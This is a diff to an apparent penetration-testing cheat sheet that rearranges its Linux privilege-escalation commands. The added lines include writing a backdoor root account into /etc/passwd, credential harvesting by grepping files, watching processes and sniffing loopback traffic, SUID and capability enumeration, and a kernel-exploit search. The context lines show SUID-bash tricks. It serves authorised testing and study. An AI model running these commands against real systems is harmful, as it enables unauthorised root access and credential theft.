@@ -3747,40 +3747,31 @@ ldapsearch -H ldap://<RHOST> -D <USERNAME> -w "<PASSWORD>" -b "CN=Users,DC=<RHOS
 ```c
 id
 sudo -l
-uname -a
 env
+cat ~/.bashrc
+cat /etc/passwd
 cat /etc/hosts
 cat /etc/fstab
-cat /etc/passwd
+lsblk
+ls -lah /etc/cron*
+crontab -l
+sudo crontab -l
+grep "CRON" /var/log/syslog
 ss -tulpn
 ps -auxf
 ls -lahv
 ls -R /home
 ls -la /opt
-capsh --print
+dpkg -l
+uname -a
 ```
 
-##### find Commands
+##### Abusing Password Authentication
 
 ```c
-find / -user <USERNAME> -ls 2>/dev/null
-find / -user <USERNAME> -ls 2>/dev/null | grep -v proc 2>/dev/null
-find / -group <GROUP> 2>/dev/null
-find / -perm -4000 2>/dev/null | xargs ls -la
-find / -type f -user root -perm -4000 2>/dev/null
-find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-find / -cmin -60    // find files changed within the last 60 minutes
-find / -amin -60    // find files accesses within the last 60 minutes
-find ./ -type f -exec grep --color=always -i -I 'password' {} \;    // search for passwords
-```
-
-##### grep for Passwords
-
-```c
-grep -R db_passwd
-grep -roiE "password.{20}"
-grep -oiE "password.{20}" /etc/*.conf
-grep -v "^[#;]" /PATH/TO/FILE | grep -v "^$"    // grep for passwords like "DBPassword:"
+openssl passwd <PASSWORD>
+echo "root2:FgKl.eqJO6s2g:0:0:root:/root:/bin/bash" >> /etc/passwd
+su root2
 ```
 
 ##### Apache2
@@ -3819,6 +3810,45 @@ env -i SHELLOPTS=xtrace PS4='$(chmod +s /bin/bash)' /usr/local/bin/<BINARY>
 function /usr/sbin/<BINARY> { /bin/bash -p; }
 export -f /usr/sbin/<BINARY>
 /usr/sbin/<BINARY>
+```
+
+##### Capabilities
+
+```c
+capsh --print
+/usr/sbin/getcap -r / 2>/dev/null
+```
+
+##### Credential Harvesting
+
+```c
+grep -R db_passwd
+grep -roiE "password.{20}"
+grep -oiE "password.{20}" /etc/*.conf
+grep -v "^[#;]" /PATH/TO/FILE | grep -v "^$"    // grep for passwords like "DBPassword:"
+watch -n 1 "ps -aux | grep pass"
+sudo tcpdump -i lo -A | grep "pass"
+```
+
+##### find Commands
+
+```c
+find / -user <USERNAME> -ls 2>/dev/null
+find / -user <USERNAME> -ls 2>/dev/null | grep -v proc 2>/dev/null
+find / -group <GROUP> 2>/dev/null
+find / -perm -4000 2>/dev/null | xargs ls -la
+find / -type f -user root -perm -4000 2>/dev/null
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+find / -writable -type d 2>/dev/null
+find / -cmin -60    // find files changed within the last 60 minutes
+find / -amin -60    // find files accesses within the last 60 minutes
+find ./ -type f -exec grep --color=always -i -I 'password' {} \;    // search for passwords
+```
+
+##### Kernel Exploits
+
+```c
+searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"
 ```
 
 ##### LD_PRELOAD
